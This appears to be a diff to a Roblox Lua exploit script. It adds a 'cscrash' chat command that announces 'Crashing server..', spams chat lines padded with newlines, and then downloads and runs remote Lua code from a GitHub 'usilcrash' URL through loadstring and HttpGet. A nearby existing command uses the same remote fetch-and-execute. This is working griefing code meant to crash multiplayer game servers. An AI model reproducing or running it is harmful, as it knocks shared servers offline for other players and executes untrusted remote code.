@@ -1189,6 +1189,32 @@ game.Players:Chat("blind all")
 wait(0.25)
 loadstring(game:HttpGet(("https://raw.githubusercontent.com/Tech-187/Lua-scripts/main/scv3-var's%20usilcrash"),true))()
 end
+if msg == prefix.."cscrash" then
+game.Players:Chat("-sm Crashing server..")
+game.Players:Chat("h \n 1")
+wait(1)
+game.Players:Chat("h \n\n 2")
+wait(1)
+game.Players:Chat("h \n\n\n 3")
+wait(1)
+game.Players:Chat("h \n\n\n\n 4 ")
+wait(1)
+game.Players:Chat("h \n\n\n\n\n 5")
+wait(1)
+game.Players:Chat("h \n\n\n\n\n\n 6")
+wait(1)
+game.Players:Chat("h \n\n\n\n\n\n\n 7")
+wait(1)
+game.Players:Chat("h \n\n\n\n\n\n\n\n 8")
+wait(1)
+game.Players:Chat("h \n\n\n\n\n\n\n\n\n 9")
+wait(1)
+game.Players:Chat("h \n\n\n\n\n\n\n\n\n\n 10")
+wait(1)
+loadstring(game:HttpGet(("https://raw.githubusercontent.com/Tech-187/Lua-scripts/main/scv3-var's%20usilcrash"),true))()
+end
+
+
 
 if string.sub(msg:lower(), 0, 7) == prefix.."super " then
 		
